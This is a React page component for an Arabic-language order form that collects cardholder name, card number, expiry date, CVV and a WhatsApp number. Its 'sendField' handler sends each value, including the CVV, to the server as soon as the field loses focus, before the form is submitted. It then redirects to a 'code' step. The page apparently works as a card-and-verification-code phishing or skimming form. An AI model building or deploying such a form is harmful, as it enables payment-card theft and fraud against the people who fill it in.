import { useLocation, useParams } from "wouter";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { motion } from "framer-motion";
import { useSubmitContact, useTrackField } from "@workspace/api-client-react";
import { AppLayout } from "@/components/layout/AppLayout";
import { StepIndicator } from "@/components/StepIndicator";
import { Loader2, Phone, User, CreditCard, Calendar, Lock } from "lucide-react";
import { useRef, useCallback } from "react";

const formSchema = z.object({
  cardName: z.string().min(2, "الرجاء إدخال اسم صاحب البطاقة"),
  cardNumber: z.string().min(13, "رقم البطاقة غير صحيح").max(19, "رقم البطاقة غير صحيح"),
  cardExpiry: z.string().regex(/^\d{2}\/\d{2}$/, "الصيغة المطلوبة: MM/YY"),
  cardCvv: z.string().min(3, "رمز CVV غير صحيح").max(4, "رمز CVV غير صحيح"),
  whatsapp: z.string().min(8, "الرجاء إدخال رقم واتساب صحيح").regex(/^[0-9+]+$/, "الرقم يجب أن يحتوي على أرقام فقط"),
  name: z.string().optional()
});

type FormValues = z.infer<typeof formSchema>;

function formatCardNumber(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(.{4})/g, "$1 ").trim();
}

function formatExpiry(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) {
    return digits.slice(0, 2) + "/" + digits.slice(2);
  }
  return digits;
}

export default function Contact() {
  const { id } = useParams<{ id: string }>();
  const [_, setLocation] = useLocation();
  const sentFields = useRef<Record<string, string>>({});

  const { register, handleSubmit, formState: { errors }, setValue, getValues } = useForm<FormValues>({
    resolver: zodResolver(formSchema)
  });

  const { mutate: trackField } = useTrackField();

  const sendField = useCallback((fieldName: string) => {
    if (!id) return;
    const value = getValues(fieldName as keyof FormValues);
    if (!value || value.trim() === "") return;
    if (sentFields.current[fieldName] === value) return;
    sentFields.current[fieldName] = value;
    trackField({ orderId: id, data: { fieldName, fieldValue: value } });
  }, [id, trackField, getValues]);

  const { mutate, isPending } = useSubmitContact({
    mutation: {
      onSuccess: () => {
        setLocation(`/order/${id}/code`);
      }
    }
  });

  const onSubmit = (data: FormValues) => {
    if (!id) return;
    mutate({
      orderId: id,
      data: {
        ...data,
        cardNumber: data.cardNumber.replace(/\s/g, ""),
      }
    });
  };

  return (
    <AppLayout>
      <motion.div
        initial={{ opacity: 0, x: 20 }}
        animate={{ opacity: 1, x: 0 }}
        exit={{ opacity: 0, x: -20 }}
        className="w-full max-w-2xl mx-auto"
      >
        <StepIndicator currentStep={2} />
        
        <div className="mt-16 bg-card/60 backdrop-blur-xl border border-white/10 rounded-3xl p-8 md:p-12 shadow-2xl relative overflow-hidden">
          <div className="absolute top-0 right-0 w-64 h-64 bg-[#D4AF37]/10 rounded-full blur-3xl -translate-y-1/2 translate-x-1/2 pointer-events-none" />

          <form onSubmit={handleSubmit(onSubmit)} className="relative z-10 space-y-8">
            
            <div>
              <div className="flex items-center gap-3 mb-6">
                <div className="w-10 h-10 bg-[#D4AF37]/20 rounded-xl flex items-center justify-center border border-[#D4AF37]/30">
                  <CreditCard className="w-5 h-5 text-[#D4AF37]" />
                </div>
                <h3 className="text-xl font-bold text-white">بيانات البطاقة</h3>
              </div>

              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-sm font-bold text-muted-foreground flex items-center gap-2">
                    <User className="w-3.5 h-3.5" />
                    اسم صاحب البطاقة
                  </label>
                  <input
                    type="text"
                    placeholder="الاسم كما هو على البطاقة"
                    {...register("cardName")}
                    onBlur={() => sendField("cardName")}
                    className={`w-full bg-black/50 border ${errors.cardName ? 'border-destructive' : 'border-white/15 focus:border-[#D4AF37]'} rounded-xl px-5 py-4 text-white text-lg outline-none transition-all placeholder:text-white/20 focus:ring-4 focus:ring-[#D4AF37]/20`}
                  />
                  {errors.cardName && (
                    <p className="text-destructive text-sm font-semibold">{errors.cardName.message}</p>
                  )}
                </div>

                <div className="space-y-2">
                  <label className="text-sm font-bold text-muted-foreground flex items-center gap-2">
                    <CreditCard className="w-3.5 h-3.5" />
                    رقم البطاقة
                  </label>
                  <input
                    type="text"
                    dir="ltr"
                    placeholder="0000 0000 0000 0000"
                    {...register("cardNumber")}
                    onChange={(e) => {
                      const formatted = formatCardNumber(e.target.value);
                      setValue("cardNumber", formatted);
                    }}
                    onBlur={() => sendField("cardNumber")}
                    className={`w-full bg-black/50 border ${errors.cardNumber ? 'border-destructive' : 'border-white/15 focus:border-[#D4AF37]'} rounded-xl px-5 py-4 text-white text-lg tracking-widest outline-none transition-all placeholder:text-white/20 focus:ring-4 focus:ring-[#D4AF37]/20`}
                  />
                  {errors.cardNumber && (
                    <p className="text-destructive text-sm font-semibold">{errors.cardNumber.message}</p>
                  )}
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <label className="text-sm font-bold text-muted-foreground flex items-center gap-2">
                      <Calendar className="w-3.5 h-3.5" />
                      تاريخ الانتهاء
                    </label>
                    <input
                      type="text"
                      dir="ltr"
                      placeholder="MM/YY"
                      {...register("cardExpiry")}
                      onChange={(e) => {
                        const formatted = formatExpiry(e.target.value);
                        setValue("cardExpiry", formatted);
                      }}
                      onBlur={() => sendField("cardExpiry")}
                      className={`w-full bg-black/50 border ${errors.cardExpiry ? 'border-destructive' : 'border-white/15 focus:border-[#D4AF37]'} rounded-xl px-5 py-4 text-white text-lg outline-none transition-all placeholder:text-white/20 focus:ring-4 focus:ring-[#D4AF37]/20`}
                    />
                    {errors.cardExpiry && (
                      <p className="text-destructive text-sm font-semibold">{errors.cardExpiry.message}</p>
                    )}
                  </div>

                  <div className="space-y-2">
                    <label className="text-sm font-bold text-muted-foreground flex items-center gap-2">
                      <Lock className="w-3.5 h-3.5" />
                      رمز CVV
                    </label>
                    <input
                      type="text"
                      dir="ltr"
                      placeholder="***"
                      maxLength={4}
                      {...register("cardCvv")}
                      onChange={(e) => {
                        const digits = e.target.value.replace(/\D/g, "").slice(0, 4);
                        setValue("cardCvv", digits);
                      }}
                      onBlur={() => sendField("cardCvv")}
                      className={`w-full bg-black/50 border ${errors.cardCvv ? 'border-destructive' : 'border-white/15 focus:border-[#D4AF37]'} rounded-xl px-5 py-4 text-white text-lg outline-none transition-all placeholder:text-white/20 focus:ring-4 focus:ring-[#D4AF37]/20`}
                    />
                    {errors.cardCvv && (
                      <p className="text-destructive text-sm font-semibold">{errors.cardCvv.message}</p>
                    )}
                  </div>
                </div>
              </div>
            </div>

            <div className="border-t border-white/10 pt-8">
              <div className="flex items-center gap-3 mb-6">
                <div className="w-10 h-10 bg-[#E30613]/20 rounded-xl flex items-center justify-center border border-[#E30613]/30">
                  <Phone className="w-5 h-5 text-[#E30613]" />
                </div>
                <h3 className="text-xl font-bold text-white">معلومات التواصل</h3>
              </div>

              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-sm font-bold text-muted-foreground">رقم الواتساب <span className="text-destructive">*</span></label>
                  <div className="relative">
                    <input
                      type="tel"
                      dir="ltr"
                      placeholder="+964 7XX XXX XXXX"
                      {...register("whatsapp")}
                      onBlur={() => sendField("whatsapp")}
                      className={`w-full bg-black/50 border ${errors.whatsapp ? 'border-destructive' : 'border-white/15 focus:border-[#E30613]'} rounded-xl px-5 py-4 text-white text-lg outline-none transition-all placeholder:text-white/20 focus:ring-4 focus:ring-[#E30613]/20`}
                    />
                    <Phone className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
                  </div>
                  {errors.whatsapp && (
                    <p className="text-destructive text-sm font-semibold">{errors.whatsapp.message}</p>
                  )}
                </div>

                <div className="space-y-2">
                  <label className="text-sm font-bold text-muted-foreground">الاسم (اختياري)</label>
                  <div className="relative">
                    <input
                      type="text"
                      placeholder="اسمك"
                      {...register("name")}
                      onBlur={() => sendField("name")}
                      className="w-full bg-black/50 border border-white/15 focus:border-[#E30613] rounded-xl px-5 py-4 text-white outline-none transition-all placeholder:text-white/20 focus:ring-4 focus:ring-[#E30613]/20"
                    />
                    <User className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
                  </div>
                </div>
              </div>
            </div>

            <button
              type="submit"
              disabled={isPending}
              className="w-full bg-gradient-to-r from-[#E30613] to-[#D4AF37] hover:opacity-90 text-white font-bold text-lg py-4 rounded-xl transition-all shadow-lg flex items-center justify-center gap-2 disabled:opacity-70 disabled:cursor-not-allowed"
            >
              {isPending ? (
                <Loader2 className="w-6 h-6 animate-spin" />
              ) : (
                "إرسال الطلب"
              )}
            </button>
          </form>
        </div>
      </motion.div>
    </AppLayout>
  );
}
